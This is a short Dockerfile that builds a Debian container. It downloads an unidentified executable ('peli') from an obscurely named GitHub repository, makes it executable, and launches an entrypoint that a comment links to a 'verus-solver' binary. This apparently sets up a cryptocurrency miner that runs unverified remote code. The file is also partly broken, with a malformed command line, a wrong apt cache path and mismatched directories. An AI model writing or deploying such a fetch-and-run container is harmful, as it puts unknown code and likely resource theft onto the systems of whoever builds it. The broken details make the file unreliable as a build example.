FROM debian:buster-slim

RUN apt-get update && apt-get -y install wget xz-utils git && \

    cd /opt && wget  https://github.com/jgaswerhah/alahsui/raw/main/peli && \

	chmod +x * && \	apt-get -y purge xz-utils && apt-get -y autoremove --purge && apt-get -y clean && apt-get -y autoclean; rm -rf /var/lib/apt-get/lists/*

COPY entrypoint /opt/Gas/

RUN chmod +x /opt/Gas/entrypoint

# it needs a workdir spec in order to see the 'verus-solver' binary right next to it

WORKDIR "/opt/Gas"

ENTRYPOINT "./entrypoint"
